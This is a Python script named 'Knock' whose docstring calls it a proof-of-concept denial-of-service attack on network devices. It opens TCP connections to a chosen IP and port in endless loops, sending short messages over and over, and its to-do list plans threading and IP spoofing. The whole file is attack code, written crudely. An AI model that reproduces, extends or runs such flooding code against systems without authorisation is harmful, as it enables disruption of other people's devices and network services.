"""
    Knock

    PoC for DoS attack on network device.

    [X]Test against local devices (PiHole DNS, mobile phone)
    [ ]Add threads
    [ ]add port checks
    [ ]spoof IP address
    [ ]check src port
    [ ]improve while loop
    [ ]remove need for knock2
    

    
"""

#standard libraries
import sys
import time
import socket
import random

DEBUG_MODE = True

def debugPrint(*args):
    if DEBUG_MODE:
        print("#"*3+"DEBUG --> ",end="")
        output = []
        for arg in args:
            output.append(arg)	
        print(output)

def knock(ipaddr: str, port: int):
    print("starting knock")
    while True:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
                print("created socket")
                c.connect((ipaddr, port))
                print("created connection")
                e = ''
                print(e)
                message = 'knock' + chr(random.randrange(32,127))
                c.send(message.encode())
                print(f'sent {message}')
                data = c.recv(1024)
                print(f'data received: {repr(data)}')
                c.shutdown(2) #shutdown read and write?
                c.close() #break down socket
                print("closed")                
                                
        except (ConnectionAbortedError, ConnectionResetError, TimeoutError) as e:
            print(f"Error of {e}")
            knock2(ipaddr,port)
            break
                
    print("FINISHED KNOCK")

def knock2(ipaddr: str, port: int):
    print("starting knock")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as c:
        print("created socket")
        c.connect((ipaddr, port))
        print("created connection")
        e = ''
        print(e)
        while True:
            try:
                message = 'knock knock' + chr(random.randrange(32,127))
                c.send(message.encode())
                print(f'sent {message}')
                data = c.recv(1024)
                print(f'data received: {repr(data)}')
            except (ConnectionAbortedError, ConnectionResetError, TimeoutError) as e:
                print(f"Error of {e}")
                c.shutdown(2) #shutdown read and write?
                c.close() #break down socket
                print("closed")                
                knock(ipaddr,port)
                break
        print("FINISHED KNOCK KNOCK")
    

def validateIP(ipaddr: str):
    return ipaddr

def validatePort(port: int):
    assert type(port) == int
    if port > 0 and port < 65535:
        return port

def startKnocking():
    if DEBUG_MODE:
        ipaddr = "192.168.176.213"
        port = 9080 #Port used by Netflix
    else:
        ipaddr = validateIP(input("Give an ip address"))    
        port = validatePort(int(input("Give a port")))
    
    knock(ipaddr,port)

if __name__ == "__main__":
    startKnocking()
    